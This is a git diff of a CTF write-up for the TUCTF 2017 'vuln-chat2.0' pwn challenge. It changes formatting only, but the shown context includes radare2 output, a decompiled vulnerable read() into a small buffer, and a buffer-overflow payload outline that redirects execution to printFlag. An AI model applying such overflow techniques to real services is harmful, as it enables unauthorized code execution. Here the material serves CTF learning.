@@ -7,8 +7,9 @@ nc vulnchat2.tuctf.com 4242
   
 [vuln-chat2.0](https://github.com/j3rrry/CTF/raw/master/2017/TU/Pwn/vuln%20chat%202.0/vuln-chat2.0) - md5: d0fe412783aaaeeddc2a6504d6dff631  
 libc.so.6 - md5: f71e966c590bfb1f53ea3410f8b489d4  
+------------------
 
-```radare
+```radare2
 [0x08048460]> iz
 vaddr=0x08048750 paddr=0x00000750 ordinal=000 sz=50 len=49 section=.rodata type=ascii string=----------- Welcome to vuln-chat2.0 -------------
 vaddr=0x08048782 paddr=0x00000782 ordinal=001 sz=22 len=21 section=.rodata type=ascii string=Enter your username:
@@ -25,7 +26,7 @@ vaddr=0x0804888f paddr=0x0000088f ordinal=011 sz=13 len=12 section=.rodata type=
 vaddr=0x0804889c paddr=0x0000089c ordinal=012 sz=20 len=19 section=.rodata type=ascii string=/bin/cat ./flag.txt
 vaddr=0x080488b0 paddr=0x000008b0 ordinal=013 sz=35 len=34 section=.rodata type=ascii string=Don't let anyone get ahold of this
 ```
-```radare
+```radare2
 [0x08048460]> afl~printFlag
 0x08048672    1 65           sym.printFlag
 ```
@@ -53,7 +54,7 @@ int doThings()
 `char buf; // [sp+1h] [bp-27h]@1`  
 `read(0, &buf, 0x2Du);`  
 `payload = "1" * (0x27 + 4) + printFlag()`  
-```shell
+```bash
 # python solve.py
 [+] Opening connection to vulnchat2.tuctf.com on port 4242: Done
 [*] Switching to interactive mode
